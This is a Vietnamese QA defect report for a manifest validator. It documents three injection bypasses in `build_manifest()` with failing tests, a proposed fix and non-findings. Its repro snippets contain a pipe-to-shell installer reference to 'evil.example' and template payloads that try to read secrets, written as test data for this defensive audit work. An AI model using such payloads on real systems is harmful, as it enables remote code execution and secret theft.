# T1 — Defects tìm thấy (độc lập, verified bằng test FAIL thật)

Cả 3 defect dưới đây là MỘT lỗ hổng gốc (root cause chung), biểu hiện ở 3
tham số khác nhau của recipe. Mức độ: **cao** — vi phạm trực tiếp
non-negotiable CLAUDE.md ("manifest chứa shell/URL-script/template nội
suy" phải bị chặn) và COMP-004.

## Root cause

`src/namios_manifest/_recipe_build.py::_require_str()` (dùng bởi
`build_manifest()` — đường chạy thật của `ManifestValidatorImpl.load()`)
KHÔNG gọi bất kỳ hàm scan injection nào trên giá trị chuỗi của param. So
sánh với `src/namios_recipe/_parse.py::_require_str()` (WP10) — hàm tương
đương ở đó gọi `_scan_string_for_injection()` để chặn:
- template nội suy `\{\{.*?\}\}` / `\$\{.*?\}` / `%\(name\)s`
- url-script `https?://... | sh|bash|powershell|cmd`

`_recipe_build.py` của WP2 chỉ có:
1. `_FORBIDDEN_PARAM_KEYS` (chặn theo **tên khóa** param, ví dụ khóa
   `shell`/`eval` — vẫn hoạt động đúng).
2. `_SHELL_METACHAR_RE` áp dụng CHỈ khi `run_installer.argv` có đúng 1
   phần tử (chặn "argv ghép thành 1 chuỗi lệnh").

Không có bước nào quét **nội dung giá trị** của `installer_ref`,
`dependency_profile_id`, `key`/`value_name`/`value` (set_registry_value),
`path_label`, `app_id`/`profile_id` — nên payload injection nằm TRONG một
param hợp lệ (không phải key lạ) lọt thẳng qua, kể cả khi
`namios_recipe` (dùng ở nơi khác trong pipeline) đã tự chứng minh biết
cách chặn chính các payload này.

## Defect MAN-03-QA-01 — `run_installer.installer_ref` url-script pipe-to-shell lọt qua `build_manifest()`

- **File/line:** `src/namios_manifest/_recipe_build.py:150` (`_require_str(params, "installer_ref", ...)`, action `run_installer`).
- **Test chứng minh (FAIL thật):** `tests/qa/T1/test_man03_recipe_injection_adversarial.py::test_run_installer_ref_with_url_pipe_to_shell_is_NOT_blocked_by_manifest_layer`
- **Repro:**
  ```python
  raw = baseline_manifest()  # mode=native, mọi field hợp lệ
  raw["recipe"] = [{
      "action": "run_installer",
      "params": {
          "installer_ref": "https://evil.example/x.sh | sh",
          "argv": ["installer.exe", "/S"],
      },
  }]
  validator.validate_schema(raw).ok          # -> True (đúng, tầng 1 không soi nội dung param)
  build_manifest(raw)                         # -> KHÔNG raise (SAI)
  ```
- **Expected:** `build_manifest(raw)` raise `ManifestLoadError` với một lỗi `code == "E_SEMANTIC_RECIPE"`, `path` trỏ `recipe[0].params.installer_ref` — giống hành vi đã có ở `namios_recipe._parse.parse_recipe_steps` cho CÙNG payload (xem `tests/unit/recipe/test_parse_allowlist.py::test_url_script_pipe_to_shell_in_installer_ref_is_rejected`, đã PASS ở suite dev).
- **Actual:** `build_manifest(raw)` trả về `Manifest` hợp lệ,
  `m.recipe[0].installer_ref == "https://evil.example/x.sh | sh"`, và
  `validate_semantic(m, ctx).install_ready == True` (không có `approved_dependency_ids`/`pinned_runner_hashes` liên quan nên không bị chặn ở đường khác).
- **Tác động:** một manifest publisher-controlled (hoặc một manifest bị
  tamper trong kho chưa ký) có thể mang `installer_ref` là lệnh pipe-to-shell
  và PASS toàn bộ 2 tầng validate của WP2 — đúng pattern mà CLAUDE.md liệt
  tên cấm tuyệt đối ("`curl|bash`", "manifest chứa... URL-script").
- **Verdict:** CONFIRMED (test tự viết, không phụ thuộc giả định sai; đối
  chứng bằng hành vi ĐÃ ĐÚNG của `namios_recipe` cho cùng input).

## Defect MAN-03-QA-02 — `set_registry_value.value` template nội suy `{{...}}` lọt qua `build_manifest()`

- **File/line:** `src/namios_manifest/_recipe_build.py:124-147` (action `set_registry_value`, gọi `_require_str(params, "value", ...)`).
- **Test chứng minh (FAIL thật):** `tests/qa/T1/test_man03_recipe_injection_adversarial.py::test_set_registry_value_with_template_interpolation_is_NOT_blocked_by_manifest_layer`
- **Repro:**
  ```python
  raw["recipe"] = [{
      "action": "set_registry_value",
      "params": {
          "key": "HKCU\\Software\\Demo", "value_name": "Mode",
          "value_type": "REG_SZ", "value": "{{ secrets.admin_password }}",
      },
  }]
  build_manifest(raw)   # -> KHÔNG raise (SAI)
  ```
- **Expected:** raise `ManifestLoadError` / `E_SEMANTIC_RECIPE` (đối chứng:
  `tests/unit/recipe/test_parse_allowlist.py::test_template_interpolation_in_value_is_rejected` đã PASS cho `namios_recipe`).
- **Actual:** build thành công, giá trị `"{{ secrets.admin_password }}"` đi
  thẳng vào `SetRegistryValue.value`.
- **Tác động:** nếu bất kỳ tầng thực thi sau này (helper/registry writer)
  diễn giải template này (hoặc chỉ đơn giản log/hiển thị nó như một tín
  hiệu "đã có secret thật được set"), đây là véc-tơ format-string/template
  injection kinh điển vào registry Windows trong Wine prefix.
- **Verdict:** CONFIRMED.

## Defect MAN-03-QA-03 — `install_dependency.dependency_profile_id` template `${...}` lọt qua `build_manifest()`

- **File/line:** `src/namios_manifest/_recipe_build.py:118-122` (action `install_dependency`).
- **Test chứng minh (FAIL thật):** `tests/qa/T1/test_man03_recipe_injection_adversarial.py::test_install_dependency_id_with_dollar_brace_template_is_NOT_blocked_by_manifest_layer`
- **Repro:**
  ```python
  raw["recipe"] = [{
      "action": "install_dependency",
      "params": {"dependency_profile_id": "${env.SECRET_DEP}"},
  }]
  build_manifest(raw)   # -> KHÔNG raise (SAI)
  ```
- **Expected:** raise `ManifestLoadError` / `E_SEMANTIC_RECIPE` (đối chứng
  `namios_recipe._parse` PASS cho cùng payload:
  `tests/unit/recipe/test_parse_allowlist.py::test_dollar_brace_template_interpolation_is_rejected`).
- **Actual:** build thành công; nếu sau đó `dependency_profile_id` này
  TRÙNG HỆT một ID "đã duyệt" trong `approved_dependency_ids` (kịch bản
  trong test: catalog vận hành sai và chót approve một chuỗi trông như
  injection), `validate_semantic().install_ready == True`.
- **Tác động:** riêng field này nguy hiểm hơn vì ngữ nghĩa "tra theo ID" —
  nếu downstream từng dùng kiểu tra cứu nào có nội suy (template engine,
  os.environ.get theo tên trích từ chuỗi...), đây là đường dò giá trị biến
  môi trường/secret theo tên bằng cách đặt tên dependency_profile_id là
  cú pháp truy xuất.
- **Verdict:** CONFIRMED.

## Khuyến nghị fix (cho dev sở hữu WP2 — KHÔNG tự sửa, chỉ báo)

Thêm một `_scan_string_for_injection()` (hoặc tái dùng logic tương đương
từ `namios_recipe._parse`, KHÔNG import chéo package — chỉ cần lặp lại
hằng số regex, đúng tinh thần "defense in depth độc lập" đã ghi trong
docstring hiện tại) vào `_require_str()` của
`src/namios_manifest/_recipe_build.py`, áp dụng cho MỌI giá trị chuỗi
param (không chỉ tên khóa). Có 6 action × các field chuỗi liên quan:
`installer_ref`, `dependency_profile_id`, `key`/`value_name`/`value`,
`path_label`, `app_id`/`profile_id`.

## Non-findings (đã tra cứu, KHÔNG phải defect — ghi lại để tránh báo nhầm)

- Khóa forbidden viết hoa (`SHELL`/`EVAL`) không khớp `_FORBIDDEN_PARAM_KEYS`
  (so khớp case-sensitive) — nhưng vẫn bị chặn qua nhánh "ngoài allowlist"
  với CÙNG `ErrorCode`, nên KHÔNG phải bypass về kết quả (chỉ sai message
  lý do). Xem test
  `test_forbidden_key_case_variant_SHELL_uppercase_is_still_rejected_but_via_allowlist_path`.
- `argv` nhiều phần tử, một phần tử chứa `;`/`|` — được chấp nhận làm dữ
  liệu literal (đúng hành vi argv-only/`shell=False`, không phải lỗ hổng).
- `architecture: "unknown"` / `prefix_architecture: "unknown"` không bị
  `validate_semantic()` chặn như TBD — KHÔNG nằm trong danh sách field bắt
  buộc theo M1-INTERFACES §7.1 (chỉ `application.build`/
  `installer_sha256`/`runtime.runner_id`/`runner_sha256`). Ghi lại như một
  **quan sát phạm vi** (không phải defect vì không trái acceptance hiện
  có), để Cường/BA cân nhắc có nên mở rộng semantic check không.
